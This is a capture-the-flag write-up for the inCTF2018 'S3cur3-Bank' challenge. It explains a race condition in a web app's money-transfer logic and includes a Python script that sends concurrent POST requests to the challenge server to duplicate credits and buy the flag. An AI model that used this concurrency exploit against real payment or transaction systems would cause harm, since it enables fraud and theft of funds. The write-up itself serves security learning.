# S3cur3-Bank

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/9.png)

44/306 = 14% of the teams solved this challenge.

## Reconnaissance

First page is a login/registration page. Let's create a new user and login.

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/10.png)

Okay, we can buy the flag for 5000 credits, but combined we only have 2000 credits. My first thought on this is that the application does not perform exclusive locks when moving money.

Psuedo code for the send function would look like this:

```python
send_money(to, amount):
  account_balance = get_account_balance(self)
  if account_balance - amount > 0
      # Enough credits to send
      send_money_to_account(to, amount_send)
      account_balance -=amount_send;
```

The insecure part of this is that there are no exclusive locks. What if we send two requests at basically the same time by using threads.

```python
send_money(A, 500) # account_balance before: 1000
send_money(A, 500) # account_balance before: 1000
```

These requests will read the account_balance which will return 1000.
Then it will send 500 credits to account A. Then subtract 500 from the original account_balance (1000-500=500).

`Account balance after: 500`

Notice something? We've sent 500*2 credits, but we still have 500 in our account. Let's apply this theory to practice.

## Exploiting the bank

```python
import requests
import threading

url = "http://18.188.42.158/bank.php?id=a839eea9f6b192ad586ad41e8bd4d4db"


def make_money():
	data = {"transfer": 500, "account": "Transfer to A"}
	response = requests.post(url,data=data)
	print response.text

try:

	t1 = threading.Thread(target=make_money, args=[])
	t2 = threading.Thread(target=make_money, args=[])
	t1.start()
	t2.start()

except:
   print "Error: unable to start thread"

```

After running the script back a few times transfering money between A and B. We can buy the flag

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/11.png)


![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/12.png)
